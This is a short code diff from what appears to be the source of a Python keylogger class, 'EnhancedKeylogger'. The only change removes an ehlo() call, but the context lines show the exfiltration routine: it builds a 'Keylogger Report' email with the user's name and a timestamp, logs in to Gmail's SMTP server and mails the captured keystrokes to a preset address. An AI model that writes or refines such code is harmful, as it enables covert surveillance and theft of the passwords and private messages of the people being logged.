@@ -181,7 +181,6 @@ class EnhancedKeylogger:
                 self.mail["Subject"] = f"Keylogger Report - {self.user} @ {timestamp}"
                 self.mail["From"] = self.from_email
                 with smtplib.SMTP("smtp.gmail.com", 587) as server:
-                    server.ehlo()
                     server.starttls()
                     server.login(self.from_email, self.password)
                     server.sendmail(self.from_email, self.to_email, self.mail.as_string())
